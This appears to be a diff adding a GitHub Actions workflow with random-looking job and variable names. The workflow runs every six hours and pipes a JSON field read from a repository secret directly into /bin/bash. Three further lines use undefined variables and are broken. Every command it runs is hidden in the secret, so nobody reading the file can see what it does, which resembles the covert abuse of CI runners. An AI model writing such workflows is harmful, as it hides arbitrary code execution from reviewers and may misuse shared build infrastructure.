@@ -1,0 +1,21 @@
+name: wengjingshi1290
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wengjingshi1290
+        env:
+          lq8: ${{ secrets.lq8 }}
+        run: |
+          echo $lq8 | jq -r .kzonj2344 | /bin/bash
+          echo $o27722 | jq -r .snxot2 | /bin/bash
+          echo $ejmi47610 | jq -r .nh316 | /bin/bash
+          echo $xrp65764 | jq -r .k33095 | /bin/bash
+
